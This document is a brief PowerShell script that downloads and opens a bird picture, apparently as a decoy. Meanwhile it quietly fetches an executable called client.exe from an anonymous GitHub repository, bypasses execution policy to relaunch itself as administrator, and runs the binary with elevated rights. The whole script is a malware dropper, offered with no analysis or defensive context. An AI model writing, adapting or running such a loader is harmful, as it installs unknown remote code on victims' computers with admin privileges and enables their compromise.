# Download the image
Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"

# Open the downloaded image
Start-Process "$env:TEMP\blue-bird.jpg"

# Download the client.exe file
$exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
$exePath = "$env:TEMP\client.exe"
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Check if the current user is an admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # If not admin, prompt to run as admin
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    exit
}

# Run the downloaded client.exe with admin privileges
Start-Process $exePath -Verb RunAs